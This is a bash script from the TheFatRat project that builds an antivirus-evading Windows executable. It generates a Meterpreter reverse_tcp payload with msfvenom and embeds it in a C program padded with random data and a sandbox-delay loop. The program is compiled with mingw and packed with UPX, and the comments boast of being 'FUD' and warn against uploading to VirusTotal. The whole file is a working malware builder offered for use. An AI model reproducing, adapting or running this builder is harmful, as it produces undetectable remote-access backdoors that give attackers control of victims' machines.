#!/bin/bash
file="config/config.path"
if [ -f "$file" ]
then
msfconsole=`sed -n 14p $file`	
msfvenom=`sed -n 15p $file`
backdoor=`sed -n 16p $file`
searchsploit=`sed -n 17p $file`
else
	echo "Configuration file does not exists , run setup.sh first ."
exit 1


fi
path=`pwd`
defcon=$path/config/conf.def
if [ -f "$defcon" ]
then
yourip=`sed -n 1p $defcon`
yourport=`sed -n 2p $defcon`
fi

function invalid1 ()
{
err=0
echo ""
if [ -z "$yourip" ]; then 
echo -e $red ""
echo "[ ! ] You must write an IP or Hostname ."
echo -e $okegreen ""
echo "IP Example : 192.168.1.34
Domain Example : myhost.com"
err=1
fi
echo ""
if [ -z "$yourport" ]; then 
echo -e $red ""
echo "[ ! ] You must write a port number between 1 & 65535 ."
err=1
fi
echo -e $okegreen ""
}

#get user local ip , public ip & hostname into variables
lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
lanip6=`ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
comp="0"
# Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
# You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
# check mingw if exists
      which i686-w64-mingw32-gcc > /dev/null 2>&1
      if [ "$?" -eq "0" ]
      then
      echo [✔]::[mingw32]: installation found!;
      comp="1"
fi
      which x86_64-w64-mingw32-gcc > /dev/null 2>&1
      if [ $? -eq 0 ]
      then
      echo [✔]::[mingw64]: installation found!;
     
if [ $comp == "0" ]
then
comp="2"
elif [ $comp == "1" ]
then
comp="3"
else
   echo [x]::[warning]:this script require mingw32 or mingw64 installed to work ;
   echo ""
   echo [!]::Run setup.sh to install mingw64 ;
   sleep 2s
   exit 1
 fi
fi



# check upx if exists
      which upx > /dev/null 2>&1
      if [ $? -eq 0 ]; then
      echo [✔]::[Upx]: installation found!;

else

   echo [x]::[warning]:this script require upx to work ;
   echo ""
   echo [!]::Run setup.sh to install upx ;
   echo ""
   sleep 2s
   exit 1
fi

###################################################################################################
# FatRat Coded By Screetsec ( Edo Maland )
# Program to create a C program after it is compiled that will bypass most AV
# Test in Kali Linux :)
# Very Slow to create Backdoor But Very powerfull for bypass AV
# Easy to Use 
# FUD for popular Antivirus :) 
# Dont Upload to virus total
####################################################################################################


#Checking
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
clear                                   
SERVICE=service;

#This colour 
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
yellow='\e[1;33m'
orange='\e[38;5;166m'

rm -f $path/output/Powerfull.exe >/dev/null 2>&1
rm -f $path/output/Powerfull-fud.exe >/dev/null 2>&1
#Banner
clear
echo
echo -e $yellow""
echo " =========================================================================="
echo -e $okegreen" FatRat Coded By Screetsec ( Edo -Maland- ) "
echo
echo -e $yellow"   / __/ /__ _    __  / _ )__ __/ /_  / _ \___ _    _____ ____/ _/_ __/ / / "
echo "  _\ \/ / _ \ |/|/ / / _  / // / __/ / ___/ _ \ |/|/ / -_) __/ _/ // / / /  "
echo " /___/_/\___/__,__/ /____/\_,_/\__/ /_/   \___/__,__/\__/_/ /_/ \_,_/_/_/   "
echo""
echo -e $okegreen" This program compiles a C program with a meterpreter reverse_tcp payload "
echo " In it that can then be executed on a windows host "
echo " Program to create a C program after it is compiled that will bypass most AV "
echo -e $yellow" =========================================================================="
echo -e $okegreen""

#input lhost and lport
echo -e $okegreen""
echo -e $yellow "Your local IPV4 address is : $lanip"
echo -e $yellow "Your local IPV6 address is : $lanip6"
echo -e $yellow "Your public IP address is : $publicip"
echo -e $yellow "Your Hostname is : $hostn"
echo -e $okegreen ""
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
if [ -z "$yourip" ]; then
read -p '  Set LHOST IP: ' yourip
fi
echo -e $okegreen ""
if [ -z "$yourport" ]; then
read -p '  Set LPORT: ' yourport
fi                                                                       
invalid1				
if [ $err == "1" ] 
then
echo -e $okegreen ""
echo -n "Press any key to restart again ."
read inp
./powerfull.sh
fi

echo ""
if [ $comp == "1" ]
then
COMPILER="i686-w64-mingw32-gcc"
fi
if [ $comp == "2" ]
then
COMPILER="x86_64-w64-mingw32-gcc"
fi

if [ $comp == "3" ]
then
echo ""
echo -e $yellow "You can compile this FUD for 32bit or 64bit windows machines"
echo ""
echo -e $green "Choose one of the following options"
echo -e $orange "+-------------------------------+"
echo -e $orange "|$white [$green 1$white ] $yellow Compile 32bit FUD Exe $orange |"
echo -e $orange "|$white [$green 2$white ] $yellow Compile 64bit FUD Exe $orange |"
echo -e $orange "+-------------------------------+"
echo ""
echo -ne $green "Choose (1 or 2) : " ;tput sgr0
read archs
case $archs in 
1)
COMPILER="i686-w64-mingw32-gcc"
echo ""
echo -e $green "32bit Selected"
sleep 1
;;
2)
COMPILER="x86_64-w64-mingw32-gcc"
echo ""
echo -e $green "64bit Selected"
sleep 1
;;
*)
COMPILER="x86_64-w64-mingw32-gcc"
echo ""
echo -e $green "Invalid Option , setting 32bit as default"
sleep 1
;;
esac
fi
echo -e $okegreen 
payload="windows/meterpreter/reverse_tcp"
msfvenomBadChars="\x00\xff"
msfvenomEncoder="x86/shikata_ga_nai"
msfvenomIterations="3"  # Recommended value: 3

randomness=3517		# The higher the randomness the more padding is added to the c program increasing the binaries size
delayRandomness=32676	# The higher the delay the longer it will take to execute the payload, may increase your chances of escaping a sandbox

#Set directory
currentDir=`pwd`
outputDir="${currentDir}/output/"
outputExe="${outputDir}Powerfull.exe"  # You can change the name of the executable on this line
outputUPX="${outputDir}Powerfull-fud.exe"  # You can change the name of the executable on this line

cProg="${currentDir}/prog.c"
cProgTemp="${currentDir}/prog.c.temp"

# Create some padding to be compiled in the C program this adds randomness to the binary
function old_generatePadding {

    counter=0
    randomNumber=$((RANDOM%${randomness}+7))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> $cProg
	randomCharnameSize=$((RANDOM%5+12))
	randomPaddingSize=$((RANDOM%1024+2048))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
        randomPadding=`cat /dev/urandom | tr -dc '_a-zA-Z0-9' | head -c ${randomPaddingSize}`
        echo "unsigned char ${randomCharname}[]=\"$randomPadding\";" >> $cProg
        let counter=counter+1
    done
}

function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> $cProg
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> $cProg
    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then
			echo "$randomString;" >> $cProg
		else
			echo $randomString >> $cProg
		fi
	done
        let counter=counter+1
    done
}


# Check to see the output directory exists
if [[ ! -d "$outputDir" ]]; then
    mkdir $outputDir
fi

echo ""
echo "You may see multiple errors until the executable is compiled successfully."
echo ""
if [[ $msfvenomIterations > 3 ]]; then
	echo "Most of the errors are due to the msfvenom iterations value is set too high."
	echo "Recommended value: msfvenomIterations=3"
fi
echo ""

# Check to see if the executable was previously created
if [[ -f "$outputExe" ]]; then
	echo "Remove the executable at ${outputExe} to recreate it."
	echo ""
fi


sleep 2


# Until the Powerfull.exe is compiled successfully loop until it is
while [[ ! -f "$outputExe" ]]; do

    # Delete the c program and recreate it
    rm -f $cProg

    generatePadding

    echo "" >> $cProg
    echo "int main(void)" >> $cProg
    echo "{" >> $cProg

    # Introduce a couple of processing loops for a delay
    echo "" >> $cProg
    echo "int zewd5 = 1, rqs3 = 1;" >> $cProg
    echo "for ( zewd5 = 1 ; zewd5 <= ${delayRandomness} ; zewd5++ )" >> $cProg
    echo "   for ( rqs3 = 1 ; rqs3 <= ${delayRandomness} ; rqs3++ )" >> $cProg
    echo "   {}" >> $cProg
    echo "" >> $cProg
  
    generatePadding
  
    echo "" >> $cProg
    $msfvenom -p ${payload} LHOST=$yourip LPORT=$yourport -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg

    generatePadding

    echo "" >> $cProg
    echo "((void (*)())buf)();" >> $cProg
    echo "" >> $cProg

    generatePadding

    echo "" >> $cProg
    echo "}" >> $cProg
	
    randomBufNameSize=$((RANDOM%10+23))
    randomBufName=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomBufNameSize}`
    cat $cProg | sed "s/buf/${randomBufName}/g" > $cProgTemp
    mv -f $cProgTemp $cProg
    # To install the following program on Kali Linux - "apt-get install gcc-mingw32"
    $COMPILER -o $outputExe $cProg

done

# Use UPX to create a second executable, testing...
upx -q --ultra-brute -o $outputUPX $outputExe
